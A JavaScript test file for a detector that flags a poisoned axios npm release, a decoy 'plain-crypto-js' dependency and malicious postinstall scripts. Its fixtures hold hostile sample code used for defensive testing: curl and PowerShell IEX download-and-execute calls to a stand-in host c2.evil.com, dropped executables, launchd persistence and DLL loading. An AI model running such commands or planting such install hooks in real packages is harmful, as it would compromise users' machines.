import { test } from 'node:test';
import assert from 'assert/strict';
import { scan } from '../backend/detectors/axios-poisoning/index.js';

test('AXS: axios@1.14.1 triggers stop condition', async () => {
  const pkgJson = { name: 'axios', version: '1.14.1', dependencies: {} };
  const findings = await scan(pkgJson);
  assert.equal(findings.length, 1);
  assert.equal(findings[0].severity, 'critical');
  assert.ok(findings[0].stopCondition);
  const ev = JSON.parse(findings[0].evidence);
  assert.equal(ev.rule, 'AXS-VER-001');
  assert.equal(ev.matchedVersion, '1.14.1');
});

test('AXS: axios@0.30.4 triggers stop condition', async () => {
  const pkgJson = { name: 'axios', version: '0.30.4', dependencies: {} };
  const findings = await scan(pkgJson);
  assert.equal(findings.length, 1);
  assert.ok(findings[0].stopCondition);
  const ev = JSON.parse(findings[0].evidence);
  assert.equal(ev.matchedVersion, '0.30.4');
});

test('AXS: axios@1.14.2 safe version = no findings', async () => {
  const pkgJson = { name: 'axios', version: '1.14.2', dependencies: {} };
  const findings = await scan(pkgJson);
  assert.equal(findings.length, 0);
});

test('AXS: non-axios package with any version = no findings', async () => {
  const pkgJson = { name: 'lodash', version: '4.17.21', dependencies: {} };
  const findings = await scan(pkgJson);
  assert.equal(findings.length, 0);
});

test('AXS: plain-crypto-js decoy dependency triggers D2', async () => {
  const pkgJson = {
    name: 'axios',
    version: '1.14.0',
    dependencies: { 'plain-crypto-js': '1.0.0' },
  };
  const findings = await scan(pkgJson);
  assert.equal(findings.length, 1);
  const ev = JSON.parse(findings[0].evidence);
  assert.ok(ev.triggeredChecks.includes('D2'));
  assert.equal(ev.details.D2.findings[0].injectedDependency, 'plain-crypto-js');
});

test('AXS: plain-crypto-js decoy in non-axios package triggers D2', async () => {
  const pkgJson = {
    name: 'simple-logger',
    version: '1.0.0',
    dependencies: { 'plain-crypto-js': '1.0.0' },
  };
  const findings = await scan(pkgJson);
  assert.equal(findings.length, 1);
  const ev = JSON.parse(findings[0].evidence);
  assert.ok(ev.triggeredChecks.includes('D2'));
});

test('AXS: no known decoy deps = no D2', async () => {
  const pkgJson = {
    name: 'simple-logger',
    version: '1.0.0',
    dependencies: { 'crypto-js': '4.2.0' },
  };
  const findings = await scan(pkgJson);
  assert.equal(findings.length, 0);
});

test('AXS: postinstall RAT with network callback triggers D3', async () => {
  const files = [
    {
      path: 'index.js',
      content: `const tmp = require('os').tmpdir(); require('fs').writeFileSync(tmp + '/evil.exe', 'bin'); require('child_process').execSync('curl http://c2.evil.com/payload');`,
    },
  ];
  const pkgJson = {
    name: 'plain-crypto-js',
    version: '1.0.0',
    scripts: { postinstall: 'node index.js' },
  };
  const findings = await scan(pkgJson, files);
  assert.equal(findings.length, 1);
  const ev = JSON.parse(findings[0].evidence);
  assert.ok(ev.triggeredChecks.includes('D3'));
  assert.ok(ev.details.D3.c2Indicators.length > 0);
});

test('AXS: cross-platform RAT with binary drop + C2 triggers D3', async () => {
  const files = [
    {
      path: 'index.js',
      content: `const tmp = require('os').tmpdir(); require('fs').writeFileSync(tmp + '/evil.exe', 'binary'); require('child_process').execSync('powershell -c "IEX (curl https://c2.evil.com/payload)"');`,
    },
  ];
  const pkgJson = {
    name: 'plain-crypto-js',
    version: '1.0.0',
    scripts: { postinstall: 'node index.js' },
  };
  const findings = await scan(pkgJson, files);
  assert.equal(findings.length, 1);
  const ev = JSON.parse(findings[0].evidence);
  assert.ok(ev.triggeredChecks.includes('D3'));
  assert.equal(ev.details.D3.payloadType, 'cross_platform_RAT');
  assert.ok(ev.details.D3.platforms.includes('windows'));
  assert.ok(ev.details.D3.platforms.includes('linux'));
  assert.ok(ev.details.D3.platforms.includes('macos'));
});

test('AXS: macOS launchd persistence triggers D3', async () => {
  const files = [
    {
      path: 'index.js',
      content: `const tmp = require('os').tmpdir(); require('fs').writeFileSync(tmp + '/evil.ps1', 'payload'); require('child_process').execSync('launchctl load /Library/LaunchDaemons/evil.plist');`,
    },
  ];
  const pkgJson = {
    name: 'plain-crypto-js',
    version: '1.0.0',
    scripts: { postinstall: 'node index.js' },
  };
  const findings = await scan(pkgJson, files);
  assert.equal(findings.length, 1);
  const ev = JSON.parse(findings[0].evidence);
  assert.ok(ev.triggeredChecks.includes('D3'));
  assert.ok(ev.details.D3.platforms.includes('macos'));
});

test('AXS: process injection DLL loading triggers D3', async () => {
  const files = [
    {
      path: 'inject.js',
      content: `const tmp = require('os').tmpdir(); require('fs').writeFileSync(tmp + '/evil.dll', 'bin'); const k = require('koffi'); k.LoadLibrary(tmp + '/evil.dll');`,
    },
  ];
  const pkgJson = {
    name: 'plain-crypto-js',
    version: '1.0.0',
    scripts: { postinstall: 'node inject.js' },
  };
  const findings = await scan(pkgJson, files);
  assert.equal(findings.length, 1);
  const ev = JSON.parse(findings[0].evidence);
  assert.ok(ev.triggeredChecks.includes('D3'));
  assert.ok(ev.details.D3.platforms.includes('windows'));
});

test('AXS: multiple signals combine with provenance', async () => {
  const files = [
    {
      path: 'index.js',
      content: `const tmp = require('os').tmpdir(); require('fs').writeFileSync(tmp + '/evil.exe', 'bin'); require('child_process').execSync('curl http://c2.evil.com/payload');`,
    },
  ];
  const pkgJson = {
    name: 'plain-crypto-js',
    version: '1.0.0',
    dependencies: {},
    scripts: { postinstall: 'node index.js' },
  };
  const findings = await scan(pkgJson, files);
  assert.equal(findings.length, 1);
  const ev = JSON.parse(findings[0].evidence);
  assert.ok(ev.triggeredChecks.includes('D3'));
  assert.ok(ev._provenance);
});

test('AXS: clean package no findings', async () => {
  const pkgJson = {
    name: 'axios',
    version: '1.14.2',
    dependencies: {},
    scripts: { test: 'node test.js' },
  };
  const findings = await scan(pkgJson);
  assert.equal(findings.length, 0);
});

test('AXS: postinstall with legitimate build command = no D3', async () => {
  const files = [{ path: 'build.js', content: 'console.log("building...");' }];
  const pkgJson = { name: 'some-pkg', version: '1.0.0', scripts: { postinstall: 'node build.js' } };
  const findings = await scan(pkgJson, files);
  assert.equal(findings.length, 0);
});
